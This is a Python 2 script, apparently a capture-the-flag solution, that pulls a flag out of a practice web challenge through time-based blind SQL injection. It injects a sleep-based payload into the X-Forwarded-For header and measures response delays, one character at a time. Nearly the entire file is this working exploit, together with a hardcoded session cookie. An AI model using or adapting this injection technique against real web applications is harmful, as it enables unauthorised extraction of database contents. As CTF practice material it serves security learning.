#conding:utf-8
#author = ch3rry
import httplib
import time
import sys

payloads = list('qwertyuiopasdfghjklzxcvbnm1234567890@._},{-')
urls = '/web/wonderkun/index.php'
flag = ''
for i in range(1,33):
	for payload in payloads:
		headers = {
		'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:54.0) Gecko/20100101 Firefox/54.0',
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
		'Accept-Language': 'en-US,en;q=0.5',
		'Accept-Encoding': 'gzip, deflate',
		'Cookie': 'Hm_lvt_34d6f7353ab0915a4c582e4516dffbc3=1500944764; Hm_lpvt_34d6f7353ab0915a4c582e4516dffbc3=1500951308; Hm_cv_34d6f7353ab0915a4c582e4516dffbc3=1*visitor*77850%2CnickName%3Ach3rry; PHPSESSID=38bm6vudqnvabnca8c1hsjo6s1',
		'X-Forwarded-For': "' or sleep(ascii(mid((select flag from flag)from %s for 1))=%s) and '1'='1" % (i,ord(payload))
		}
		start_time = time.time()
		conn = httplib.HTTPConnection('ctf5.shiyanbar.com',timeout=20)
		conn.request(method='GET',url=urls,headers=headers)
		r = conn.getresponse().read()
		print '*',
		if time.time()-start_time > 1:
			flag += payload
			sys.stdout.write('\n[+]'+flag)
			break
print "\n[Done] The Flag is : ctf{%s}" %flag
